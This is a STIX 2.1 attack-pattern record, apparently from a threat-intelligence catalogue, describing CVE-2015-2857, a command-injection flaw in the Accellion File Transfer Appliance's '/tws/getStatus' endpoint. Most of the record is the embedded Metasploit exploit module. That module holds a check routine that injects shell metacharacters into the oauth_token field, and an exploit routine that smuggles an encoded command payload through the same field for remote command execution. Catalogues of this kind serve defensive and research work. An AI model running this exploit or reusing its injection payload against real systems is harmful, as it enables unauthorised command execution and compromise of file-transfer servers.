{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3d62e26a-3601-4d86-93c6-b8ac32b3a8f5",
    "created": "2024-08-14T17:00:33.623498Z",
    "modified": "2024-08-14T17:00:33.623502Z",
    "name": "Accellion FTA getStatus verify_oauth_token Command Execution",
    "description": " This module exploits a metacharacter shell injection vulnerability in the Accellion File Transfer appliance. This vulnerability is triggered when a user-provided 'oauth_token' is passed into a system() call within a mod_perl handler. This module exploits the '/tws/getStatus' endpoint. Other vulnerable handlers include '/seos/find.api', '/seos/put.api', and /seos/mput.api'. This issue was confirmed on version FTA_9_11_200, but may apply to previous versions as well. This issue was fixed in software update FTA_9_11_210. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/accellion_fta_getstatus_oauth.rb",
            "external_id": "accellion_fta_getstatus_oauth.rb"
        },
        {
            "source_name": "reference",
            "url": "http://r-7.co/R7-2015-08"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-2857"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Accellion FTA getStatus verify_oauth_token Command Execution',\n      'Description'    => %q{\n          This module exploits a metacharacter shell injection vulnerability in the Accellion\n        File Transfer appliance. This vulnerability is triggered when a user-provided\n        'oauth_token' is passed into a system() call within a mod_perl handler. This\n        module exploits the '/tws/getStatus' endpoint. Other vulnerable handlers include\n        '/seos/find.api', '/seos/put.api', and /seos/mput.api'. This issue was confirmed on\n        version FTA_9_11_200, but may apply to previous versions as well. This issue was\n        fixed in software update FTA_9_11_210.\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['URL', 'http://r-7.co/R7-2015-08'],\n          ['CVE', '2015-2857']\n        ],\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'       => 1024,\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl telnet',\n            }\n        },\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2015-07-10'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptBool.new('SSL', [true, 'Use SSL', true])\n      ])\n  end\n\n  def check\n    uri = '/tws/getStatus'\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => uri,\n      'vars_post' => {\n        'transaction_id' => rand(0x100000000),\n        'oauth_token'    => 'invalid'\n    }})\n\n    unless res && res.code == 200 && res.body.to_s =~ /\"result_msg\":\"MD5 token is invalid\"/\n      return Exploit::CheckCode::Safe\n    end\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => uri,\n      'vars_post' => {\n        'transaction_id' => rand(0x100000000),\n        'oauth_token'    => \"';echo '\"\n    }})\n\n    unless res && res.code == 200 && res.body.to_s =~ /\"result_msg\":\"Success\",\"transaction_id\":\"/\n      return Exploit::CheckCode::Safe\n    end\n\n    Msf::Exploit::CheckCode::Vulnerable\n  end\n\n  def exploit\n\n    # The token is embedded into a command line the following:\n    # `/opt/bin/perl /home/seos/system/call_webservice.pl $aid oauth_ws.php verify_access_token '$token' '$scope'`;\n    token = \"';#{payload.encoded};echo '\"\n\n    uri   = '/tws/getStatus'\n\n    # Other exploitable URLs:\n    # * /seos/find.api (works with no other changes to this module)\n    # * /seos/put.api  (requires some hoop jumping, upload)\n    # * /seos/mput.api (requires some hoop jumping, token && upload)\n\n    print_status(\"Sending request for #{uri}...\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => uri,\n      'vars_post' => {\n        'transaction_id' => rand(0x100000000),\n        'oauth_token'    => token\n    }})\n\n    if res && res.code == 200 && res.body.to_s =~ /\"result_msg\":\"Success\",\"transaction_id\":\"/\n      print_status(\"Valid response received...\")\n    else\n      if res\n        print_error(\"Unexpected reply from the target: #{res.code} #{res.message} #{res.body}\")\n      else\n        print_error(\"No reply received from the target\")\n      end\n    end\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-07-10",
    "x_mitre_platforms": [
        "['unix']"
    ]
}